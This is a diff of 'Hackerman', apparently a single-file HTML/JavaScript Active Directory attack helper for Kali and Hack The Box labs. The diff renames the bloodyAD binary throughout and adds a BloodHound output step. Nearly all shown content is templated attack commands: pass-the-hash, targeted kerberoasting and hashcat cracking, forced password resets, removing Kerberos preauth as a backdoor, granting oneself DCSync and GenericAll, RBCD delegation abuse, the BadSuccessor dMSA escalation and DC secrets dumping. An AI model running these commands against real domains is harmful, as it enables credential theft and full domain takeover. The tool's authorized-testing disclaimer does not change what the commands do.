@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hackerman v1.9.0 — AD Attack Helper (Kali · HTB)</title>
+<title>Hackerman v1.10.0 — AD Attack Helper (Kali · HTB)</title>
 <style>
 :root{
   --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
@@ -219,7 +219,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
 
 <header>
   <div class="hwrap">
-    <div class="brand">Hackerman <b>v1.9.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="brand">Hackerman <b>v1.10.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
     <div class="hactions">
       <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
       <button id="presetSave" title="Save current context as preset">Save</button>
@@ -274,7 +274,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
   <section id="tab-legend" class="tab"></section>
 </main>
 
-<footer class="mono">Hackerman v1.9.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+<footer class="mono">Hackerman v1.10.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
 
 <div id="focusOverlay" class="hidden">
   <div id="focusBox" role="dialog" aria-modal="true" tabindex="-1" aria-label="recipe focus">
@@ -1155,7 +1155,7 @@ function renderLegend(){
   const tab = $('#tab-legend');
   tab.innerHTML = '';
   const about = document.createElement('div');
-  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.9.0</h2>' +
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.10.0</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
     RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries. Offline, no dependencies, no telemetry.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
@@ -1521,82 +1521,83 @@ cmds:[
 /* ===== BLOODYAD ===== */
 R({id:'bloodyad-basics',cat:'bloodyad',title:'bloodyAD — auth & object reads',desc:'Swiss army knife for LDAP writes. Three auth styles: password, NT hash, Kerberos.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}' --attr sAMAccountName,userAccountControl`,'password auth + read'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' get object '{{user}}'`,'pass-the-hash (-p :NTHASH)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{user}}'`,'kerberos ccache'],
- [`bloodyAD --host {{dc_fqdn}} -d {{domain}} -u '{{user}}' -k keytab={{keytab}} -f aes get object '{{user}}'`,'kerberos keytab'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '' --attr domainControllerFunctionality`,'rootDSE / schema level']
-],note:'Add <span class="mono">-s</span> for LDAPS, <span class="mono">-v DEBUG</span> for troubleshooting. <span class="mono">get object ""</span> prints the rootDSE.'});
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}' --attr sAMAccountName,userAccountControl`,'password auth + read'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' get object '{{user}}'`,'pass-the-hash (-p :NTHASH)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{user}}'`,'kerberos ccache'],
+ [`bloodyad --host {{dc_fqdn}} -d {{domain}} -u '{{user}}' -k keytab={{keytab}} -f aes get object '{{user}}'`,'kerberos keytab'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '' --attr domainControllerFunctionality`,'rootDSE / schema level']
+],note:'On Kali the binary is <span class="mono">bloodyad</span>; pipx installs expose both <span class="mono">bloodyad</span> and <span class="mono">bloodyAD</span>. Add <span class="mono">-s</span> for LDAPS, <span class="mono">-v DEBUG</span> for troubleshooting. <span class="mono">get object ""</span> prints the rootDSE.'});
 
 R({id:'bloodyad-writable',cat:'bloodyad',title:'bloodyAD — find what you can write',desc:'Enumerates every object your account has write rights over. Huge shortcut vs BloodHound when you only have one user.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'all writable objects'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get writable --detail`,'all writable objects via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype COMPUTER --right WRITE --detail`,'writable computers'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype USER,GROUP --detail`,'writable users/groups'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype GPO,DOMAIN --detail`,'writable GPOs / domain object'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --bh`,'export as BloodHound zip']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'all writable objects'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get writable --detail`,'all writable objects via ccache'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype COMPUTER --right WRITE --detail`,'writable computers'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype USER,GROUP --detail`,'writable users/groups'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype GPO,DOMAIN --detail`,'writable GPOs / domain object'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --bh`,'export as BloodHound zip']
 ],note:'Start every "what now?" moment here. If the output is huge, narrow with <span class="mono">--otype</span> and <span class="mono">--right WRITE</span>.'});
 
 R({id:'bloodyad-spn',cat:'bloodyad',title:'bloodyAD — add / remove SPN (kerberoast + redirect)',desc:'Write access to servicePrincipalName unlocks two attacks: make an account roastable, or move a delegation SPN somewhere more useful.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dn}}" "fake/spn"`,'A: targeted kerberoast — set SPN (your notes style)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'A: password variant'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dn}}" "fake/spn"`,'A: targeted kerberoast — set SPN (your notes style)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'A: password variant'],
  [`impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request-user '{{target_user}}' -outputfile {{hashfile}}`,'A: roast the SPN you just set'],
  [`hashcat -m 13100 {{hashfile}} {{wordlist}}`,'A: crack (no proxy)','n'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap delspn "{{dn}}" "fake/spn"`,'A: cleanup'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dc_dn}}" "{{spn}}"`,'B: redirect delegation SPN to the DC (your notes)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap delspn "{{dn}}" "fake/spn"`,'A: cleanup'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dc_dn}}" "{{spn}}"`,'B: redirect delegation SPN to the DC (your notes)'],
  [`bloodyad --dc-ip {{dc_ip}} -d {{domain}} -u '{{user}}' -k --host {{dc_fqdn}} addspn "{{dc_dn}}" "{{spn}}"`,'B: v1 addspn (your original)'],
  [`bloodyad --dc-ip {{dc_ip}} -d {{domain}} -u '{{user}}' -k --host {{dc_fqdn}} delspn "{{dn}}" "{{spn}}"`,'B: v1 delspn (your original)']
 ],note:'v2 exposes <span class="mono">addspn/delspn</span> under <span class="mono">msldap</span> (v1 used them top-level). The target needs a <b>DN</b>, not a sAMAccountName. Use case <b>A</b> = targeted kerberoast on demand. Use case <b>B</b> = move the SPN that a constrained delegation points at onto the DC — full chain in the <b>SPN hijack</b> recipe.'});
 
 R({id:'bloodyad-password',cat:'bloodyad',title:'bloodyAD — set / change password',desc:'Reset a password with GenericAll / User-Force-Change-Password.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set password '{{target_user}}' 'Pwn3d123!'`,'admin-style reset'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} set password '{{target_user}}' 'Pwn3d123!'`,'reset via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap changeuserpw "{{dn}}" 'Pwn3d123!'`,'change (admin, no old pw)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap changeuserpw "{{dn}}" 'Pwn3d123!' --oldpass '{{password}}'`,'self change'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set password '{{target_user}}' 'Pwn3d123!'`,'admin-style reset'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} set password '{{target_user}}' 'Pwn3d123!'`,'reset via ccache'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap changeuserpw "{{dn}}" 'Pwn3d123!'`,'change (admin, no old pw)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap changeuserpw "{{dn}}" 'Pwn3d123!' --oldpass '{{password}}'`,'self change'],
  [`nxc smb {{dc_host}} -u '{{target_user}}' -p 'Pwn3d123!'`,'verify new creds']
 ],note:'Password reset on a user with active sessions/shares can break the lab — prefer shadow credentials or targeted kerberoast when possible.'});
 
 R({id:'bloodyad-uac',cat:'bloodyad',title:'bloodyAD — UAC flags (preauth, disable account)',desc:'UserAccountControl manipulation: kill preauth for AS-REP, unlock/disable accounts.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add uac -f DONT_REQ_PREAUTH '{{target_user}}'`,'remove Kerberos preauth → AS-REP roast'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add uac -f DONT_REQ_PREAUTH '{{target_user}}'`,'remove preauth via ccache'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add uac -f DONT_REQ_PREAUTH '{{target_user}}'`,'remove Kerberos preauth → AS-REP roast'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add uac -f DONT_REQ_PREAUTH '{{target_user}}'`,'remove preauth via ccache'],
  [`impacket-GetNPUsers '{{domain}}/{{target_user}}' -dc-ip {{dc_ip}} -no-pass -request -outputfile {{hashfile}}`,'roast without preauth'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove uac -f DONT_REQ_PREAUTH '{{target_user}}'`,'restore preauth'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove uac -f ACCOUNTDISABLE '{{target_user}}'`,'enable a disabled account'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add uac -f DONT_EXPIRE_PASSWORD '{{target_user}}'`,'password never expires']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove uac -f DONT_REQ_PREAUTH '{{target_user}}'`,'restore preauth'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove uac -f ACCOUNTDISABLE '{{target_user}}'`,'enable a disabled account'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add uac -f DONT_EXPIRE_PASSWORD '{{target_user}}'`,'password never expires']
 ],note:'DONT_REQ_PREAUTH on an existing user is a classic persistence/backdoor trick — and a fast roast when the user has a weak password.'});
 
 R({id:'bloodyad-groups',cat:'bloodyad',title:'bloodyAD — group membership & rights',desc:'Add members, grant GenericAll / DCSync / RBCD.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'add member to group'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add groupMember '{{group}}' '{{target_user}}'`,'add member via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove groupMember '{{group}}' '{{target_user}}'`,'remove member (cleanup)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself GenericAll'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'`,'grant yourself DCSync'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'grant RBCD over target']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'add member to group'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add groupMember '{{group}}' '{{target_user}}'`,'add member via ccache'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove groupMember '{{group}}' '{{target_user}}'`,'remove member (cleanup)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself GenericAll'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'`,'grant yourself DCSync'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'grant RBCD over target']
 ],note:'GenericAll/DCSync require you to own the object or hold WriteDacl on it. <span class="mono">add rbcd TARGET SERVICE</span> is the bloodAD one-liner for the delegation write step.'});
 
 R({id:'bloodyad-enum',cat:'bloodyad',title:'bloodyAD — enumerate AD status',desc:'Trusts, children, memberships, DNS, and a quick BloodHound collector.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get trusts`,'domain trusts'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get trusts`,'domain trusts via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get children --otype useronly --target '{{domain}}'`,'users under domain'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get membership '{{target_user}}'`,'group membership of account'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get dnsDump --zone {{domain}}`,'AD DNS records'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get bloodhound --path {{hashfile}}`,'bloodyAD BloodHound collector (basic)']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get trusts`,'domain trusts'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get trusts`,'domain trusts via ccache'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get children --otype useronly --target '{{domain}}'`,'users under domain'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get membership '{{target_user}}'`,'group membership of account'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get dnsDump --zone {{domain}}`,'AD DNS records'],
+ [`mkdir -p bloodhound`,'create the output directory first — bloodyad aborts if --path does not exist','n'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get bloodhound --path bloodhound`,'collect into ./bloodhound (zip; --transitive adds trust data)']
 ],note:'<span class="mono">get writable ./ get trusts</span> are the two commands to run on any new credential — they often beat a full BloodHound run for speed.'});
 
 R({id:'bloodyad-badsuccessor',cat:'bloodyad',title:'bloodyAD — BadSuccessor (dMSA privilege escalation)',desc:'Windows Server 2025 introduced delegated MSAs. A dMSA linked to a privileged account inherits its rights — bloodyAD can create and link one.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap badsuccessor_check`,'check if the domain still allows the BadSuccessor path'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add badSuccessor 'evil' -t 'CN={{target_user}},CN=Users,{{domain_dn}}'`,'create dMSA evil$ linked to a privileged account'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap dmsas`,'list dMSAs and their state'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object 'evil$' --attr msDS-ManagedPassword,msDS-ManagedAccountPrecededByLink`,'read the dMSA managed password and link'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap gmsa`,'decrypt readable managed passwords (KDS)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap deluser 'CN=evil,CN=Managed Service Accounts,{{domain_dn}}'`,'CLEANUP: delete the dMSA']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap badsuccessor_check`,'check if the domain still allows the BadSuccessor path'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add badSuccessor 'evil' -t 'CN={{target_user}},CN=Users,{{domain_dn}}'`,'create dMSA evil$ linked to a privileged account'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap dmsas`,'list dMSAs and their state'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object 'evil$' --attr msDS-ManagedPassword,msDS-ManagedAccountPrecededByLink`,'read the dMSA managed password and link'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap gmsa`,'decrypt readable managed passwords (KDS)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap deluser 'CN=evil,CN=Managed Service Accounts,{{domain_dn}}'`,'CLEANUP: delete the dMSA']
 ],note:'BadSuccessor (2025): any principal with create-child rights could create a dMSA and set <span class="mono">msDS-ManagedAccountPrecededByLink</span> to a privileged account — the dMSA then inherits that account permissions. <span class="mono">badsuccessor_check</span> reports whether the domain still allows it (patched builds require rights on the target). Adjust the target/OU DNs, and use the <span class="mono">gmsa</span> helper when the managed password is readable.'});
 
 /* ===== KERBEROS ===== */
@@ -1653,7 +1654,7 @@ cmds:[
  [`# 7) per-tool invocation (KRB5CCNAME must point at your ccache):`,'cheat sheet','n'],
  [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass {{dc_fqdn}} -just-dc`,'impacket family: -k -no-pass (env inline)'],
  [`KRB5CCNAME={{ccache}} nxc smb {{dc_host}} -u '{{user}}' -k --use-kcache --dns-server {{dc_ip}}`,'netexec: -k --use-kcache (env inline)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{user}}'`,'bloodyAD: -k ccache=FILE (no env needed)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{user}}'`,'bloodyAD: -k ccache=FILE (no env needed)'],
  [`KRB5CCNAME={{ccache}} certipy find -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -stdout`,'certipy: -k -no-pass (env inline)'],
  [`net rpc password '{{target_user}}' 'Pwn3d123!' -U '{{domain}}/{{user}}' --use-krb5-ccache={{ccache}} -S {{dc_host}}`,'samba net: --use-krb5-ccache=FILE']
 ],note:'Typical failures: <span class="mono">KRB_AP_ERR_SKEW</span> = clock — sync (<span class="mono">ntpdate/rdate/chrony</span>) or wrap a single command with <span class="mono">faketime</span>. <span class="mono">KDC_ERR_WRONG_REALM</span> = krb5.conf. <span class="mono">Server not found in Kerberos database</span> = missing /etc/hosts entry or wrong SPN (<span class="mono">kvno</span> verifies it). If <span class="mono">-k</span> is silently ignored, KRB5CCNAME is not set — check with <span class="mono">echo $KRB5CCNAME</span>; stale caches: <span class="mono">unset KRB5CCNAME</span> + <span class="mono">klist -A</span>. Kerberos always needs the FQDN; IPs break SPNs. <span class="mono">-no-pass</span> tells impacket not to prompt when using <span class="mono">-k</span>.'});
@@ -1679,11 +1680,11 @@ cmds:[
 
 R({id:'targeted-kerberoast',cat:'krb',title:'Targeted kerberoast (write SPN on a user)',desc:'No roastable SPN? Give a user you can write to one, roast, clean up.',
 cmds:[
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'set SPN'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'set SPN'],
  [`impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request-user '{{target_user}}' -outputfile {{hashfile}}`,'roast'],
  [`KRB5CCNAME={{ccache}} impacket-GetUserSPNs '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}} -request-user '{{target_user}}' -outputfile {{hashfile}}`,'roast via ccache'],
  [`hashcat -m 13100 {{hashfile}} {{wordlist}}`,'crack (no proxy)','n'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap delspn "{{dn}}" "fake/spn"`,'remove SPN']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap delspn "{{dn}}" "fake/spn"`,'remove SPN']
 ],note:'Great against high-value accounts with weak passwords — no service disruption, fully reversible. Requires GenericWrite/WriteProperty on the SPN attribute.'});
 
 R({id:'gettgt',cat:'krb',title:'getTGT — obtain tickets from secrets',desc:'Turn password / NT hash / AES key into a usable ccache (overpass-the-hash).',
@@ -1747,11 +1748,11 @@ cmds:[
  [`impacket-findDelegation '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'all delegation (impacket)'],
  [`KRB5CCNAME={{ccache}} impacket-findDelegation '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'all delegation via ccache (env inline)'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --trusted-for-delegation`,'unconstrained candidates'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap constrained`,'constrained (msldap)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap constrained`,'constrained via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap unconstrained`,'unconstrained (msldap)'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap s4u2proxy`,'S4U2Proxy actors'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity,msDS-AllowedToDelegateTo,userAccountControl`,'RBCD attr on target']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap constrained`,'constrained (msldap)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap constrained`,'constrained via ccache'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap unconstrained`,'unconstrained (msldap)'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap s4u2proxy`,'S4U2Proxy actors'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity,msDS-AllowedToDelegateTo,userAccountControl`,'RBCD attr on target']
 ],note:'<span class="mono">userAccountControl</span> bit 0x80000 = TRUSTED_FOR_DELEGATION (unconstrained), 0x1000000 = TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition). RBCD is stored in <span class="mono">msDS-AllowedToActOnBehalfOfOtherIdentity</span> on the target.'});
 
 R({id:'rbcd-read',cat:'deleg',title:'RBCD step 1 — read current delegation state',desc:'See who (if anyone) is already allowed to act on behalf of the target computer.',
@@ -1759,7 +1760,7 @@ cmds:[
  [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}:{{password}}'`,'read RBCD entry'],
  [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}' -hashes ':{{nthash}}'`,'read via PtH'],
  [`KRB5CCNAME={{ccache}} impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}' -k -no-pass`,'read via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity`,'bloodyAD read'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity`,'bloodyAD read'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --trusted-for-delegation`,'spot unconstrained leaders']
 ],note:'<span class="mono">Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span> = nobody can RBCD yet. You need write access on the target computer object: GenericAll, GenericWrite, WriteDACL, or <span class="mono">WriteAccountRestrictions</span>.'});
 
@@ -1769,7 +1770,7 @@ cmds:[
  [`impacket-addcomputer -method LDAPS -computer-name '{{computer_name}}' -computer-pass '{{computer_pass}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'LDAPS (needs cert/PKINIT)'],
  [`KRB5CCNAME={{ccache}} impacket-addcomputer -method SAMR -computer-name '{{computer_name}}' -computer-pass '{{computer_pass}}' -k -no-pass '{{domain}}/{{user}}' -dc-ip {{dc_ip}}`,'SAMR via ccache'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M maq`,'check MachineAccountQuota'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add computer '{{computer_name}}' '{{computer_pass}}'`,'bloodyAD alternative (no $ in name)']
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add computer '{{computer_name}}' '{{computer_pass}}'`,'bloodyAD alternative (no $ in name)']
 ],note:'Successful output: <span class="mono">[*] Successfully added machine account {{computer_name}} with password {{computer_pass}}.</span> If MAQ is 0 and you lack rights: relay NTLM to LDAP and use <span class="mono">ntlmrelayx --delegate-access</span> instead. Cleanup at the end: <span class="mono">impacket-addcomputer ... -delete</span> or bloodyAD <span class="mono">remove computer</span>.'});
 
 R({id:'rbcd-write',cat:'deleg',title:'RBCD step 3 — grant delegation from rogue machine',desc:'Point the target computer at your rogue machine account.',
@@ -1777,7 +1778,7 @@ cmds:[
  [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action write '{{domain}}/{{user}}:{{password}}' -delegate-from '{{computer_name}}'`,'impacket write'],
  [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action write '{{domain}}/{{user}}' -hashes ':{{nthash}}' -delegate-from '{{computer_name}}'`,'write via PtH'],
  [`KRB5CCNAME={{ccache}} impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action write '{{domain}}/{{user}}' -k -no-pass -delegate-from '{{computer_name}}'`,'write via ccache'],
- [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'bloodyAD one-liner'],
+ [`bloodyad --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'bloodyAD one-liner'],
  [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}:{{password}}'`,'verify'],
  [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action flush '{{domain}}/{{user}}:{{password}}'`,'CLEANUP: flush all']
